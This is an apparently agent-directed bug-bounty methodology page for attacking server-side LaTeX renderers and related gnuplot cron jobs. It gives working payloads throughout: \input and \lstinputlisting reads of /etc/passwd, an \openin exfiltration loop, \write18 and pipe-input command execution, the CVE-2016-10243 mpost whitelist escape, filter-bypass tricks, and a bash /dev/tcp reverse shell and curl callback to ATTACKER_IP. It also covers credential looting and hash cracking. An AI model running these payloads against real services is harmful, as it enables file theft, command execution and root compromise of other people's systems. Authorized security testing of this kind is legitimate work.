---
technology: "LaTeX / server-side TeX rendering"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
source: "corpus-grounded (command-context gate, internal coverage ledger) + upstream-verified: TeX Live web2c manual section 5.5 (shell_escape = p default since TeX Live 2009; --shell-escape / --no-shell-escape; shell_escape_commands whitelist; openin_any = a, openout_any = p), CVE-2016-10243 (mpost whitelisted -> arbitrary commands; MITRE/NVD, scumjr PoC 'Pwning coworkers thanks to LaTeX'), Checkoway/Shacham/Rescorla USENIX LEET 2010 (TeX file-I/O primitives and previewer exfiltration), gnuplot docs (system / '!'), LaTeX listings package docs (\\lstinputlisting), 2026-11-12"
provenance: "corpus-grounded: 4 contributing writeups (internal coverage ledger, gate documented in header); upstream CVEs verified against primary sources during enrichment; basis of this page summarized from the unit ledger"
---

Companion page: [[latex|LaTeX overview]] — what this surface is and where you will meet it. Tool notes live in the tools vault; Appendix A names tools in prose.

# Server-side LaTeX bug bounty methodology

**Scope:** web services and batch jobs that pass user-controlled text to a TeX engine (equation renderers, markdown/PDF pipelines, template compilers), plus their plotting siblings (gnuplot scripts consumed by scheduled jobs). **Out of scope:** client-side editors that render in the browser, and generic LFI in the wrapping application — the engine must be in the chain.

**Authorization:** these chains read files and potentially execute commands as the service user. Stay inside granted scope, prefer existence-probes (`/etc/hostname`) over dumping credential files, and treat execution demos as end-of-chain evidence only.

## Decision tree (one screen)

1. Rendered output contains your literal input → Phase 1 (map the filter with control sequences of every family).
2. A control sequence compiles → Phase 2 (file read; escalate typeset read to verbatim read).
3. Read confirmed → Phase 3 (shell-escape triage: none / restricted / full).
4. Restricted mode → Phase 3b (whitelist escapes) before giving up on execution.
5. Read-only and hardened → Phase 4 (loot paths that matter; then check the gnuplot/cron sibling).
6. Execution confirmed → Phase 5 (stabilize and loot the compile user's context).

## Phase 1 — Fingerprint the renderer and its filter

- Enumerate the surface: the render endpoint's parameters, whether output is PNG/PDF/error text, whether the web root directory-lists (boilerplate `.tex` files and package lists are commonly exposed next to the renderer script).
- Read the boilerplate if you can: `\usepackage{...}` lines are the capability list (`listings` → verbatim input; `gnuplottex`/`epstopdf`-adjacent packages → helper-binary execution; `pandoc`-generated boilerplate → raw-attribute blocks may pass).
- Map the filter with one probe per family and record the exact rejection:
  `\input{/etc/hostname}` (classic read) · `\lstinputlisting{/etc/hostname}` (package read) · `\immediate\write18{id}` (shell) · `\input{|id}` (pipe shell) · `\openin5=/etc/hostname` (below-typesetting read).
- Note mode restrictions: "inline math only / one-liner" is not a boundary — control sequences execute inside `$...$`.

## Phase 2 — File read (the default-allowed family)

Escalate from noisy to clean extraction:

```latex
% 1. typeset read (mangled: catcodes, fonts, line breaks; commonly blocklisted)
\input{/etc/passwd}

% 2. verbatim-ish read via the listings package (rarely blocklisted)
\lstinputlisting{/etc/passwd}
$\lstinputlisting{/etc/passwd}$          % wrapped for inline-math-only services

% 3. clean read below the typesetting layer (Checkoway et al. exfiltration loop)
\newread\foo \openin\foo=/etc/passwd
\loop\unless\ifeof\foo \read\foo to \line
  \message{^^J<<<\meaning\line>>>^^J}   % marker-tagged, unexpanded
\repeat \closein\foo
```

- The `\message` output lands in the log/error text the service returns; `\meaning` prints the line without executing it, so hostile file contents do not explode in the engine.
- If output is an image only, read in small windows and prefer files whose content survives rendering (hash files, configs).
- Standard targets in order of value: web server vhost configs (`/etc/apache2/sites-enabled/*`, nginx includes) → `.htaccess` → sibling `.htpasswd` (crack `$apr1$` offline — John the Ripper with a rockyou-sized list) → application source next to the renderer → `/proc/self/cgroup` (reveals the service's container/unit name) → the systemd unit file → the real webroot and its source, then environment files and SSH keys of the compile user.

## Phase 3 — Shell-escape triage

```latex
\immediate\write18{id > /tmp/pwn.out}   % full escape: executes at once
\input{|"id > /tmp/pwn.out"}            % pipe form, same gate
\write18{...}                           % without \immediate runs at page shipout
```

- **Nothing executes:** engine runs `--no-shell-escape` or `shell_escape = f`. Stop testing execution; the finding is the file read (and the sibling-job angle, Phase 4b).
- **Executes:** either the deployment passes `-shell-escape` (some package "needed" it) or `shell_escape = t`. Confirm blind with an out-of-band callback (`curl http://ATTACKER_IP/$(id -u)`) since stdout rarely returns. Document *why* it executed — the flag's presence is the report's core fact.
- **Errors mention an unapproved command name:** you are in **restricted mode** (`shell_escape = p`, the TeX Live default since 2009) — go to Phase 3b.

### 3b. Restricted-mode escapes (whitelisted helpers)

The whitelist (`shell_escape_commands`: bibtex, kpsewhich, makeindex, repstopdf, mpost and friends, per engine/version) contains members that run commands themselves:

```latex
% CVE-2016-10243 — mpost whitelisted -> arbitrary command execution
\immediate\write18{mpost -ini "-tex=bash -c '(id;uname -sm)>/tmp/pwn'" "x.mp"}
% then read /tmp/pwn back with the Phase 2 loop
```

- Probe each whitelist member's argument surface before concluding restricted mode is safe; the epstopdf/repstopdf family (ghostscript wrappers) has its own hardening history.
- Escalation via write primitives: `\write`/`\openout` to a webroot or cron-watched directory is clamped by `openout_any = p` but NOT inside the compile tree — a renderer writing output into a served directory can be steered to drop files.

## Phase 4 — Filter bypass patterns (when Phase 1 probes bounced)

- **Different primitive, same capability:** blocklisted `\input` → `\lstinputlisting`, `\InputIfFileExists`, `\verbatiminput` (package-dependent), or the `\openin` loop.
- **Prefix shift:** blocklist matches `\write18{` → `\immediate\write18{`; commands without `\immediate` queue until shipout (later, but still executes).
- **Construction:** `\csname TeX\endcsname`-style indirection and `\catcode` reassignment hide names from string filters.
- **Delimiter requirement:** payloads rejected bare but accepted inside `$...$` (or `\(...\)`) — the wrapper is part of the payload.
- **Layer confusion:** in pandoc pipelines, the markdown layer looks safe but a raw block (`` `...`{=latex} `` with raw_attribute enabled) reopens the engine verbatim.

## Phase 4b — The gnuplot .plt sibling

Adjacent plotting jobs are a separate, root-flavored path:

- Enumerate scheduled interpreters: cron units or scripts that walk a directory and run `gnuplot <file>` on every `.plt` (or `.gp`) found — often as root, often on stats-rendering hosts.
- The directory is frequently world-writable while unreadable (`drwxrwxr-x` vs listing denied): write a probe script, do not try to read the directory.

```gnuplot
# probe: system executes via the OS shell (upstream: gnuplot system command)
system "id > /tmp/pwn.out"
# bind-shell variant
system "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1'"
```

- Note `!` is the interactive shorthand for `system`; in scripts the function form is reliable. Success is root execution on the next scheduler tick.

## Phase 5 — Post-execution

- Identify the executing user (`id`) — engine user vs root (cron sibling) changes the report entirely.
- Loot order for the compile user: environment/config of the render service, credentials in the webroot, the filter's own blocklist file (it documents what the operators feared), and any sibling services' configs revealed by the vhost files you read.
- Persist only within scope; the standard proof is a callback plus one file read across privilege boundaries.

## Command quick reference

```latex
$\lstinputlisting{/etc/passwd}$                              % verbatim read (listings)
\newread\f \openin\f=X \read\f to\l \message{\meaning\l}    % clean read loop
\immediate\write18{cmd}                                     % shell (full escape)
\input{|"cmd"}                                              % pipe-input shell
\immediate\write18{mpost -ini "-tex=bash -c 'cmd'" "x.mp"}  % restricted-mode escape
```

## Appendix A — Tools in prose

Port scans and service fingerprinting with nmap; hash cracking of `$apr1$`/bcrypt web credentials with John the Ripper or hashcat; HTTP probing and parameter tampering with curl or Burp Suite; out-of-band callbacks via a listener with nc/ncat or an interact.sh-style collaborator; signature/HMAC recomputation in CyberChef when the pipeline forwards to signed integrations. The engine-side payloads themselves need only the renderer's own form.
